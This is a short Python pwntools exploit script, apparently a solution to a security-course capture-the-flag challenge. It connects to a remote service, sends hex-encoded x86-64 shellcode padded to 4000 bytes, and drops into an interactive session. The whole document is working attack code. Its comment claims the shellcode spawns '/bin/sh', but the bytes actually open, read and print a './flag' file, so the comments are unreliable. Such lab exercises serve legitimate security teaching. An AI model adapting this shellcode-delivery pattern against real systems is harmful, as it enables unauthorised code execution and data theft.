from pwn import *

# 远程服务器地址
HOST = "cs412.epfl.ch"
PORT = 9020

# 生成 64 位 execve("/bin/sh") shellcode
shellcode = bytes.fromhex('4831c048bf2e2f666c61670000574889e74831f6b8020000000f054889c74831c04889e6ba500000000f054889c2b801000000bf010000000f054831c0b83c0000004831ff0f05')

# 确保 shellcode 长度符合要求，填充到 4000 字节
shellcode = shellcode.ljust(4000, b"\x90")  # NOP 填充，防止出错

# 连接远程服务器
p = remote(HOST, PORT)

# 读取欢迎信息
print(p.recv().decode())

# 发送 Shellcode
p.sendline(shellcode)

# 进入交互模式
p.interactive()
